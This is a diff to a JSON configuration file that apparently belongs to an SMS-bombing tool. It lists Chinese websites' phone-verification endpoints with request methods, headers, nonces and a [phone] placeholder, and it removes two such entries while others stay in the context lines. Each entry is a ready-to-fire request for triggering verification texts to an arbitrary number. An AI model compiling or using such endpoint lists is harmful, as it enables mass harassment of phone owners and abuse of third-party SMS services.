@@ -266,26 +266,6 @@
         }
     },
     {
-        "desc": "野兔",
-        "url": "https://www.yetu.net/wp-admin/admin-ajax.php",
-        "method": "post",
-        "header": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": {
-            "user_phone": "[phone]",
-            "send_sms_code_nonce": "2be4ce92f8",
-            "sms_code": "",
-            "user_pass": "",
-            "member_form_register_nonce": "4a84f7d0d6",
-            "_wp_http_referer": "/register",
-            "action": "wpcom_send_sms_code"
-        },
-        "form": ""
-    },
-    {
         "desc": "入党",
         "url": "https://api.diantui.wxthe.com/addon/life/auth/phone/sendsms",
         "method": "post",
@@ -412,13 +392,6 @@
     {
         "desc": "https://m.ctscd.com",
         "url": "http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=[phone]&type=Mobile&checktext=[phone]&_=1624877392029",
-        "method": "get",
-        "header": "",
-        "data": ""
-    },
-    {
-        "desc": "https://dss.xiongmaopeilian.com",
-        "url": "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=[phone]",
         "method": "get",
         "header": "",
         "data": ""
